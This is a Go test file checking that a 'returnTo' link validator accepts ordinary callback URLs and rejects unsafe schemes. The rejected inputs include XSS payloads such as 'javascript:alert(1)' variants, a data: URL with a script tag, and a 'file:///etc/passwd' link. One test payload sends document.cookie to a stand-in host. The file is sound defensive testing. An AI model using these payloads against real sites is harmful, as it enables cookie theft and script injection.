package api

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/flokiorg/lokihub/tests/mocks"
)

func TestParseReturnTo_KeepsLinksToOtherAppsAndSites(t *testing.T) {
	for _, raw := range []string{
		"https://example.com/callback?state=1",
		"http://localhost:3000",
		"myapp://nwc",
		"nostr+walletconnect://connect",
	} {
		u, err := parseReturnTo(raw)
		require.NoError(t, err, raw)
		assert.Equal(t, raw, u.String())
	}

	u, err := parseReturnTo("")
	require.NoError(t, err)
	assert.Nil(t, u)
}

func TestParseReturnTo_RefusesLinksThatRunInTheHubsPage(t *testing.T) {
	for _, raw := range []string{
		"javascript:alert(1)//",
		"JavaScript:alert(1)",
		"vbscript:msgbox(1)",
		"data:text/html,<script>alert(1)</script>",
		"blob:https://example.com/0",
		"file:///etc/passwd",
		"about:blank",
		"java\tscript:alert(1)",
		" javascript:alert(1)",
		"/apps",
		"//example.com",
	} {
		_, err := parseReturnTo(raw)
		assert.Error(t, err, "%q", raw)
	}
}

// The link is refused before anything is created: appsSvc is nil here, so
// reaching it would panic.
func TestCreateApp_RefusesUnsafeReturnToBeforeCreatingTheApp(t *testing.T) {
	theAPI := &api{svc: mocks.NewMockService(t), cfg: mocks.NewMockConfig(t)}
	response, err := theAPI.CreateApp(&CreateAppRequest{
		Name:     "app",
		ReturnTo: "javascript:fetch('//x/'+document.cookie)//",
	})

	assert.Nil(t, response)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "returnTo")
}
